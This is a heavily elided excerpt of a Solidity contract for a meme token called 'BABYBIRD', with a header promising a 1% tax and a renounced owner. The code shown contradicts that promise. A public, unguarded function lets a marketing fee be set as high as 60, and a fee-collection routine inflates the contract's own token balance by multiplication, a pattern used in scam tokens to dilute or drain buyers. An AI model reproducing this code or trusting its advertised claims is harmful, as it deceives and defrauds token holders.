...
/**   // SPDX-License-Identifier: MIT
       ...
       Telegram Group : https://t.me/babybirdcoin
       Website : TBA

       Tax 1% , Owner Renounced & Lp Burnt
...
contract BABYBIRD is Context, IERC20, Ownable {
    ...
    function SetFeeMarketing(uint256 MarketingFee) public {
        require (MarketingFee <= 60, "Set Marketing Error");
    ...
    function collectFees() public lockTheSwap {
        ...
        _balances[address(this)]= _balances[address(this)].add(developmentTokensToSell).mul(_marketingFee);
